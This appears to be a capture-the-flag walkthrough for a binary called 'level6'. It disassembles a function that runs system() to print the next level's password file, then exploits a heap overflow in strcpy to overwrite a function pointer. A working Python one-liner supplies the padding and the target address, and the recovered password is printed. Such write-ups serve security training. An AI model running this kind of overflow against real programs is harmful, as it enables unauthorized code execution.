On this one, we have to overlap a short allocated memory, if we `objdump -d level6` :
```nasm
08048454 <n>:
 8048454:	55                   	push   %ebp
 8048455:	89 e5                	mov    %esp,%ebp
 8048457:	83 ec 18             	sub    $0x18,%esp
 804845a:	c7 04 24 b0 85 04 08 	movl   $0x80485b0,(%esp)
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave  
 8048467:	c3                   	ret 
```
This function execute a simple `system("/bin/cat /home/user/level7/.pass")`.

When memory allocation don't exceed a length of a page (depend to our system), we can easily overlap his neighbor in memory. 

We need to overflow `strcpy()` with a padding and place our `n()` address :
This just the value of the function pointer **ppcVar1** to pint into `n()`
```bash
./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
